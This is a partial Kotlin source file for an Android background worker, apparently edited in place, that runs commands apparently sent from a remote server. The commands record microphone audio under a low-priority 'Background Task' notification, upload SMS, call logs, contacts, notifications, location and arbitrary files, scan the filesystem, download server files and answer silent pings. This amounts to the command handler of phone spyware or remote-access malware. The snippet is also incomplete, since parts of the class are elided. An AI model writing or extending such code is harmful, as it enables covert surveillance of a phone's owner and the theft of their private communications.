package com.elfinsaddle.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo // <-- ADD THIS IMPORT
import android.location.Location
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.elfinsaddle.MainApplication
import com.elfinsaddle.R
import com.elfinsaddle.data.remote.ApiClient
import com.elfinsaddle.data.remote.NetworkResult
import com.elfinsaddle.data.repository.DeviceRepository
import com.elfinsaddle.util.FileSystemManager
import com.elfinsaddle.util.SystemInfoManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.io.IOException

class DataFetchWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private const val TAG = "DataFetchWorker"
        private const val FOREGROUND_NOTIFICATION_ID = 3
        private const val RECORDING_DURATION_MS = 10_000L // 10 seconds

        const val KEY_COMMAND = "command"
        const val KEY_FILE_PATH = "filePath"
        const val KEY_IS_SILENT = "silent"

        // Commands
        const val COMMAND_RECORD_AUDIO = "record_audio"
        const val COMMAND_UPLOAD_AUDIO_RECORDING = "upload_audio_recording"

        const val COMMAND_SYNC_ALL = "sync_all"
        const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_UPLOAD_FILE = "upload_file"
        const val COMMAND_DOWNLOAD_FILE = "download_file"
        const val COMMAND_PING = "ping"


        // ▼▼▼ THIS FUNCTION IS MODIFIED ▼▼▼
        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
            val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }

            val workRequestBuilder = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(dataBuilder.build())
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())

            // THIS IS THE KEY FIX: Mark the job as "expedited"
            if (command == COMMAND_RECORD_AUDIO) {
                workRequestBuilder.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                Log.d(TAG, "Scheduling EXPEDITED work for command: $command")
            } else {
                Log.d(TAG, "Scheduling regular work for command: $command")
            }

            WorkManager.getInstance(context).enqueue(workRequestBuilder.build())
        }
        // ▲▲▲ END OF MODIFIED FUNCTION ▲▲▲
    }

    // ... (rest of the class is the same until createForegroundInfo)

    // ▼▼▼ THIS FUNCTION IS MODIFIED ▼▼▼
    private fun createForegroundInfo(): ForegroundInfo {
        val notification = NotificationCompat.Builder(applicationContext, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
            .setContentTitle("Background Task")
            .setContentText("Recording audio...")
            .setSmallIcon(R.drawable.ic_recording_dot)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        // For Android 14+ this is mandatory. For older versions, it's good practice.
        val foregroundServiceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        } else {
            0
        }
        
        return ForegroundInfo(FOREGROUND_NOTIFICATION_ID, notification, foregroundServiceType)
    }
    // ▲▲▲ END OF MODIFIED FUNCTION ▲▲▲
    
    // ... (the rest of the file remains the same)
    private suspend fun recordAndUploadAudio(): Result {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            Log.e(TAG, "Cannot record audio, permission missing.")
            return Result.failure() // Fail so it doesn't retry without permission
        }

        val recordingFile = File(applicationContext.cacheDir, "recording_${System.currentTimeMillis()}.amr")
        var mediaRecorder: MediaRecorder? = null

        try {
            // 1. Set the worker to run in the foreground
            val foregroundInfo = createForegroundInfo()
            setForeground(foregroundInfo)

            // 2. Initialize and start the recorder
            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(applicationContext)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }).apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(recordingFile.absolutePath)
                prepare()
                start()
            }
            Log.i(TAG, "Recording started, saving to ${recordingFile.absolutePath}")

            // 3. Wait for the duration
            delay(RECORDING_DURATION_MS)

        } catch (e: Exception) {
            Log.e(TAG, "Recording failed during setup or execution", e)
            return Result.failure()
        } finally {
            // 4. Stop and release the recorder
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                Log.i(TAG, "Recording stopped.")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping media recorder, file might be corrupt.", e)
            }
        }

        // 5. Upload the file
        if (recordingFile.exists() && recordingFile.length() > 0) {
            Log.d(TAG, "Uploading recorded file: ${recordingFile.name}")
            val result = apiClient.uploadAudioRecording(recordingFile, systemInfoManager.getDeviceId())
            // Clean up the file regardless of upload success to prevent filling up storage
            recordingFile.delete()
            return if (result is NetworkResult.Success) Result.success() else Result.retry()
        } else {
            Log.w(TAG, "Recording file is empty or does not exist. No upload performed.")
            return Result.failure()
        }
    }
    
    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_SYNC_ALL -> syncAllData()
            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() is NetworkResult.Success
            COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
            COMMAND_PING -> sendPingResponse()
            COMMAND_UPLOAD_AUDIO_RECORDING -> uploadAudioRecording()
            else -> {
                Log.w(TAG, "Unknown command received: $command")
                false
            }
        }
    }
    
    private suspend fun syncAllData(): Boolean {
        Log.i(TAG, "Starting full differential data sync...")
        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() is NetworkResult.Success else true
        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() is NetworkResult.Success else true
        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() is NetworkResult.Success else true
        val notificationsSuccess = deviceRepository.syncNotifications() is NetworkResult.Success
        return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
    }

    private suspend fun uploadAudioRecording(): Boolean {
        val filePath = inputData.getString(KEY_FILE_PATH) ?: run {
            Log.e(TAG, "Audio upload failed: file path not provided.")
            return true // Return true to not retry a job that can't succeed
        }
        val file = File(filePath)
        if (!file.exists()) {
            Log.e(TAG, "Audio upload failed: file does not exist at path $filePath")
            return true // Don't retry if the file is gone
        }

        Log.d(TAG, "Uploading audio recording from: $filePath")
        val result = apiClient.uploadAudioRecording(file, systemInfoManager.getDeviceId())

        if (result is NetworkResult.Success) {
            Log.i(TAG, "Successfully uploaded audio recording. Deleting local file.")
            file.delete()
        } else {
            Log.e(TAG, "Failed to upload audio recording. The file will be kept for the next retry.")
        }
        return result is NetworkResult.Success
    }

    private suspend fun uploadRequestedFile(): Boolean {
        val filePath = inputData.getString("filePath") ?: return false
        val file = File(filePath)
        if (!file.exists() || !file.canRead() || file.isDirectory) {
            Log.e(TAG, "Cannot upload file. Invalid path: $filePath")
            return false
        }
        val deviceId = systemInfoManager.getDeviceId()
        val result = apiClient.uploadRequestedFile(file, deviceId, filePath)
        return result is NetworkResult.Success
    }

    private suspend fun downloadFileFromServer(): Boolean {
        val serverFilePath = inputData.getString("serverFilePath") ?: return false
        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
        return downloadedFile?.exists() == true
    }

    private suspend fun fetchAndSendLocation(): Boolean {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
        val location = getCurrentLocation()
        val message = if (location != null) "Lat=${location.latitude}, Lon=${location.longitude}" else "Not available"
        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
        return result is NetworkResult.Success
    }

    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val batteryInfo = systemInfoManager.getBatteryStatus()
        val message = "Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "system_info", message)
        return result is NetworkResult.Success
    }

    private suspend fun sendPingResponse(): Boolean {
        val isSilent = inputData.getString(KEY_IS_SILENT)?.toBoolean() ?: false
        val message = "Pong! Device online at ${System.currentTimeMillis()}"
        val extras = mapOf("isSilent" to isSilent)
        val result = apiClient.sendStatusUpdate(
            deviceId = systemInfoManager.getDeviceId(),
            statusType = "ping",
            message = message,
            extras = extras
        )
        return result is NetworkResult.Success
    }

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(applicationContext, permission) == PackageManager.PERMISSION_GRANTED

    private suspend fun getCurrentLocation(): Location? = try {
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            LocationServices.getFusedLocationProviderClient(applicationContext)
                .getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        } else null
    } catch (e: SecurityException) {
        Log.e(TAG, "Failed to get current location due to security exception", e)
        null
    } catch (e: Exception) {
        Log.e(TAG, "Failed to get current location", e)
        null
    }
}
